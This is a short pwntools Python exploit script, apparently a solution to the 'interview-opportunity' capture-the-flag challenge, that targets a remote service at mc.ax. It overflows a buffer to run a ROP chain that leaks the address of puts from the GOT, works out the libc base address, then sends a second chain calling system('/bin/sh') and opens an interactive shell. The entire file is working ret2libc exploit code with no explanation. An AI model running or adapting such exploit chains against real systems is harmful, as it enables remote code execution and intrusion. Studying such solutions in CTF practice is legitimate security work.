from pwn import *
context.clear(arch='amd64')
elf = ELF('./interview-opportunity')
libc = ELF('./libc.so.6')
# libc = ELF('/usr/lib/libc.so.6')
rop = ROP(elf)

rop.raw("A" * 34)
rop.puts(elf.got['puts'])

# p = process('./interview-opportunity')
p = remote('mc.ax', 31081)
p.recvuntil(b'Why should you join DiceGang?')
p.send(rop.chain())
p.recvuntil(b'Hello: \n')
p.recvline()
leaked_puts = p.recvuntil(b'\n')[:-1]
log.success(f'{leaked_puts=}')
log.success(f'{leaked_puts.hex()=}')


libc.address = int.from_bytes(leaked_puts, 'little') - libc.symbols['puts']
log.success(f'{libc.address=}')

rop2 = ROP(elf)
rop2.raw("A" * 34)

log.success(f'{libc.symbols["system"]=}')

sh_addr = next(libc.search(b'/bin/sh'))
log.success(f'{sh_addr=}')

rop2.call(libc.symbols['system'], [sh_addr])
p.recvuntil(b'Why should you join DiceGang?')
p.send(rop2.chain())
p.interactive()